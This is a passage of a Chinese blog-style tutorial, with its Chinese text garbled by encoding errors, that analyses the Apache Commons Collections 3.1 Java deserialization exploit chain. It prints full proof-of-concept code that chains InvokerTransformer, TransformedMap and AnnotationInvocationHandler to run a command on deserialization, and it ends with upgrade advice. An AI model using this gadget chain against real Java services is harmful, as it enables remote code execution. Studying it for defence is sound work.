FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //2.æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœåŠ¡ç«¯ååºåˆ—åŒ–æˆChainedTransformeræ ¼å¼ï¼Œå†è°ƒç”¨transformå‡½æ•°Transformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);}}</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24822ba4d14747858166a8c065c96838><p class=pgc-img-caption></p></div><p>å®Œæˆå‘½ä»¤æ‰§è¡ŒæœåŠ¡ç«¯æ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ol start=1><li>æœåŠ¡ç«¯ååºåˆ—åŒ–æˆ‘ä»¬çš„è¾“å…¥æˆChainedTransformerç±»å‹</li><li>è°ƒç”¨è¿™ä¸ªè¾“å…¥çš„transformå‡½æ•°</li></ol><p>è½¬å˜çš„ç±»å‹æ˜¯ä¸€ä¸ªæ•°æ®è½¬åŒ–é“¾æ•°æ®æ ¼å¼ï¼Œå¾ˆæ˜æ˜¾æœåŠ¡ç«¯ä¸å¯èƒ½å­˜åœ¨è¿™ç§ä»£ç ï¼Œåˆ©ç”¨ä»·å€¼ä¸è¶³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç»§ç»­å»¶é•¿è¿™ä¸ªæ¼æ´é“¾ã€‚</p><p><strong>å°è£…æˆMap</strong></p><p>ç”±äºæˆ‘ä»¬å¾—åˆ°çš„æ˜¯ChainedTransformerï¼Œä¸€ä¸ªè½¬æ¢é“¾ï¼ŒTransformedMapç±»æä¾›å°†mapå’Œè½¬æ¢é“¾ç»‘å®šçš„æ„é€ å‡½æ•°ï¼Œåªéœ€è¦æ·»åŠ æ•°æ®è‡³mapä¸­å°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªè½¬æ¢é“¾æ‰§è¡Œpayloadã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠè§¦å‘æ¡ä»¶ä»æ˜¾æ€§çš„è°ƒç”¨è½¬æ¢é“¾çš„transformå‡½æ•°å»¶ä¼¸åˆ°ä¿®æ”¹mapçš„å€¼ã€‚å¾ˆæ˜æ˜¾åè€…æ˜¯ä¸€ä¸ªå¸¸è§„æ“ä½œï¼Œææœ‰å¯èƒ½è¢«è§¦å‘ã€‚</p><p>TransformedMap</p><p>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);}</p><p>tryä¸€ä¸‹ï¼š</p><p>public static void main(String args) throws Exception { //1.å®¢æˆ·ç«¯æ„å»ºæ”»å‡»ä»£ç //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(outerMap); //2.æœåŠ¡ç«¯æ¥å—ååºåˆ—åŒ–ï¼Œå‡ºå‘æ¼æ´//è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœåŠ¡ç«¯ååºåˆ—åŒ–æˆMapæ ¼å¼ï¼Œå†è°ƒç”¨transformå‡½æ•°Map outerMap_now = (Map)fin.readObject; //2.1å¯ä»¥ç›´æ¥mapæ·»åŠ æ–°å€¼ï¼Œè§¦å‘æ¼æ´//outerMap_now.put("123", "123");//2.2ä¹Ÿå¯ä»¥è·å–mapé”®å€¼å¯¹ï¼Œä¿®æ”¹valueï¼Œvalueä¸ºvalueï¼Œfoobar,è§¦å‘æ¼æ´Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next;onlyElement.setValue("foobar");}</p><p>äº²æµ‹æœ‰æ•ˆ</p><p><strong>ç¬¬å››æ­¥ jdk1.7 AnnotationInvocationHandlerçš„readObjectå¤å†™ç‚¹</strong></p><p>ä¸Šé¢çš„æ¼æ´è§¦å‘æ¡ä»¶ä»ç„¶ä¸å¤Ÿå®Œç¾ï¼Œéœ€è¦æœåŠ¡ç«¯æŠŠæˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ä¸ºmapï¼Œå¹¶å¯¹å€¼è¿›è¡Œä¿®æ”¹ã€‚ä¹‹å‰ä¹Ÿè¯´è¿‡å®Œç¾çš„ååºåˆ—åŒ–æ¼æ´è¿˜éœ€è¦ä¸€ä¸ªreadobjectå¤å†™ç‚¹ï¼Œä½¿åªè¦æœåŠ¡ç«¯æ‰§è¡Œäº†readObjectå‡½æ•°å°±ç­‰äºå‘½ä»¤æ‰§è¡Œã€‚</p><p>åœ¨jdk1.7ä¸­å°±å­˜åœ¨ä¸€ä¸ªå®Œç¾çš„readobjectå¤å†™ç‚¹çš„ç±»sun.reflect.annotation.AnnotationInvocationHandlerã€‚æˆ‘ä»¬å…ˆçœ‹ä»–çš„æ„é€ å‡½æ•°</p><p>AnnotationInvocationHandler(Class&lt;? extends Annotation> var1, Map&lt;String, Object> var2) {Class var3 = var1.getInterfaces; if (var1.isAnnotation && var3.length == 1 && var3[0] == Annotation.class) {//var1æ»¡è¶³è¿™ä¸ªifæ¡ä»¶æ—¶this.type = var1;//ä¼ å…¥çš„var1åˆ°this.typethis.memberValues = var2;//æˆ‘ä»¬çš„mapä¼ å…¥this.memberValues} else { throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");}}</p><p>readobjectå¤å†™å‡½æ•°ï¼š</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //é»˜è®¤ååºåˆ—åŒ–var1.defaultReadObject;AnnotationType var2 = null; try {var2 = AnnotationType.getInstance(this.type);} catch (IllegalArgumentException var9) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var3 = var2.memberTypes;//Iterator var4 = this.memberValues.entrySet.iterator;//è·å–æˆ‘ä»¬æ„é€ mapçš„è¿­ä»£å™¨while(var4.hasNext) {Entry var5 = (Entry)var4.next;//éå†mapè¿­ä»£å™¨String var6 = (String)var5.getKey;//è·å–keyçš„åç§°Class var7 = (Class)var3.get(var6);//è·å–var2ä¸­ç›¸åº”keyçš„classç±»ï¼Ÿè¿™è¾¹å…·ä½“var3æ˜¯ä»€ä¹ˆä¸ªå«ä¹‰ä¸å¤ªæ‡‚ï¼Œä½†æ˜¯è‚¯å®švar7ã€8ä¸¤è€…ä¸ä¸€æ ·if (var7 != null) {Object var8 = var5.getValue;//è·å–mapçš„valueif (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //ä¸¤è€…ç±»å‹ä¸ä¸€è‡´ï¼Œç»™var5èµ‹å€¼ï¼ï¼å…·ä½“èµ‹å€¼ä»€ä¹ˆå·²ç»ä¸å…³é”®äº†ï¼åªè¦èµ‹å€¼äº†å°±ä»£è¡¨æ‰§è¡Œå‘½ä»¤æˆåŠŸvar5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass + "[" + var8 + "]")).setMember((Method)var2.members.get(var6)));}}}}}</p><p>è™½ç„¶ç›¸å¯¹äºè¿™ä¸ªç±»å…·ä½“åšä»€ä¹ˆï¼Œå®åœ¨æ˜¯æ²¡æœ‰ç²¾åŠ›å»ææ¸…æ¥šäº†ï¼Œä½†æ˜¯å®ƒæœ€ç»ˆå¯¹äºæˆ‘ä»¬ä¼ å…¥æ„é€ å‡½æ•°çš„mapè¿›è¡Œéå†èµ‹å€¼ã€‚è¿™æ ·å°±å¼¥è¡¥äº†æˆ‘ä»¬ä¹‹å‰ååºåˆ—åŒ–éœ€è¦æœåŠ¡ç«¯å­˜åœ¨ä¸€äº›æ¡ä»¶çš„ä¸è¶³ï¼Œå½¢æˆå®Œç¾ååºåˆ—åŒ–æ”»å‡»ã€‚</p><p>æœ€ç»ˆæ¨¡æ‹Ÿæ”»å‡»ä»£ç </p><p>public static void main(String args) throws Exception { //1.å®¢æˆ·ç«¯æ„å»ºæ”»å‡»ä»£ç //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //åå°„æœºåˆ¶è°ƒç”¨AnnotationInvocationHandlerç±»çš„æ„é€ å‡½æ•°Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶ctor.setAccessible(true); //è·å–AnnotationInvocationHandlerç±»å®ä¾‹Object instance = ctor.newInstance(Target.class, outerMap); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(instance); //2.æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœåŠ¡ç«¯ååºåˆ—åŒ–fin.readObject;}</p><p>æˆåŠŸ</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/a4c79ee037ac4359b1d974630c0e5bb0><p class=pgc-img-caption></p></div><p>è‡³æ­¤ï¼Œæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯æ„é€ äº†payloadå‘é€è‡³æœåŠ¡ç«¯ï¼Œåªè¦æœåŠ¡ç«¯</p><ol start=1><li>å¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œååºåˆ—åŒ–</li><li>jdkç‰ˆæœ¬ä¸º1.7</li></ol><p>å°±å¯ä»¥ç›´æ¥å®Œæˆå‘½ä»¤æ‰§è¡Œï¼Œå®Œç¾ï¼</p><p><strong>jdk1.8ä¸ºä»€ä¹ˆä¸è¡Œå‘¢</strong></p><p>é‚£ä¹ˆjdk1.8ä¸ºå•¥ä¸è¡Œå‘¢,çœ‹ä¸€ä¸‹jdk8é‡Œé¢çš„sun.reflect.annotation.AnnotationInvocationHandler readObjectå¤å†™ç‚¹ï¼š</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {GetField var2 = var1.readFields;Class var3 = (Class)var2.get("type", (Object)null);Map var4 = (Map)var2.get("memberValues", (Object)null);AnnotationType var5 = null; try {var5 = AnnotationType.getInstance(var3);} catch (IllegalArgumentException var13) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var6 = var5.memberTypes;LinkedHashMap var7 = new LinkedHashMap;String var10;Object var11; for(Iterator var8 = var4.entrySet.iterator; var8.hasNext; var7.put(var10, var11)) {Entry var9 = (Entry)var8.next;var10 = (String)var9.getKey;var11 = null;Class var12 = (Class)var6.get(var10); if (var12 != null) {var11 = var9.getValue; if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) { //å¾ˆä¼¤å¿ƒçš„ï¼Œæ²¡æœ‰äº†mapèµ‹å€¼è¯­å¥var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass + "[" + var11 + "]")).setMember((Method)var5.members.get(var10));}}}</p><p>å› ä¸ºè¿™ä¸ªå‡½æ•°å‡ºç°äº†å˜åŠ¨ï¼Œä¸å†æœ‰èµ‹å€¼è¯­å¥ï¼Œæ‰€ä»¥è§¦å‘ä¸äº†æ¼æ´ã€‚</p><p><strong>No.6å†™åœ¨åé¢</strong></p><p>è‡³æ­¤æˆ‘ä»¬å°±å®Œæˆcommon-collection 3.1ç‰ˆæœ¬ jdk1.7ç‰ˆæœ¬ä¸‹çš„POCå¤ç°å’Œåˆ©ç”¨é“¾åˆ†æã€‚å½“ç„¶è¿˜æœ‰common-collection ä¸åŒç»„ä»¶ç‰ˆæœ¬ï¼Œä¸åŒç¯å¢ƒä¸‹pocå’Œåˆ©ç”¨é“¾å‡æœ‰ä¸åŒï¼Œåœ¨ysoserialä¸‹å°±æœ‰7ï¼Œ8ä¸­åˆ©ç”¨æ–¹å¼ã€‚è¿˜å¯ä»¥é€šè¿‡rmiæ¨¡å¼è¿›è¡Œåˆ©ç”¨ç­‰ã€‚</p><p>ä½†æ˜¯ç”±äºè¿™ç¯‡åšå®¢å†™çš„å¤ªé•¿äº†ï¼Œæ€è·¯ä¹Ÿä¸€ç›´æ–­æ–­ç»­ç»­ï¼Œå…¶ä»–å†…å®¹ä¹‹åå†é™†ç»­å­¦ä¹ åˆ†æå§~</p><p><strong>No.7ä¿®å¤æ„è§</strong></p><p>commons-collectionsç»„ä»¶ç‰ˆæœ¬ å‡çº§è‡³å®˜æ–¹æœ€æ–°ç‰ˆæœ¬</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'åºåˆ—åŒ–','JAVA','commons'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>